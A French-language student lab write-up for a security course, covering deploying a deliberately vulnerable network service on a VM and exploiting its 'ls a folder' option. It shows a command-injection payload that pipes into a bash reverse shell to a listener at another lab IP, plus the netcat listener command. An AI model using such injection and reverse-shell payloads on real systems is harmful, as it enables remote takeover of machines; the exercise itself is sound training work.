## Partie 1

### 1. A vos marques

🌞 **Télécharger l'application depuis votre VM**

```cmd
curl -O https://gitlab.com/it4lik/b3-csec-2024/-/blob/main/efrei_server
```

🌞 **Lancer l'application `efrei_server`**

```cmd
LISTEN_ADDRESS=192.168.56.114 ./efrei_server
```

🌞 **Prouvez que l'application écoute sur l'IP que vous avez spécifiée**

```cmd
[antna@localhost ~]$ ss -tuln | grep 8888
tcp   LISTEN 0      100    192.168.56.114:8888      0.0.0.0:*
```

### 2. Prêts

🌞 **Se connecter à l'application depuis votre PC**

```cmd
antna@antna-box:~$ nc 192.168.56.114 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) :
```

### 3. Hackez

🌞 **Euh bah... hackez l'application !**

Du coté du client on se rend compte qu'en choisissant l'option 4 on peut choisir un dossier à ls puis suivi d'un pipe injecter une commande. On injecte donc un revrese shell en bash et on setup un sever d'ecoute sur une autre machine.

```
Ton choix (1, 2, 3 ou 4) : 4
Exécuter la commande ls vers le dossier : /etc | sh -i >& /dev/udp/192.168.56.115/4242 0>&1
```

```
nc -u -lvp -4242
```


🌟 **BONUS : DOS l'application**

- il faut rendre l'application inopérante
- pour être précis, un DOS ici, c'est qu'aucun autre client ne doit pouvoir se connecter
- utilisez un autre vecteur que la vulnérabilité précédente pour provoquer le DOS


> ➜ [**Lien vers la partie 2**](./part2.md)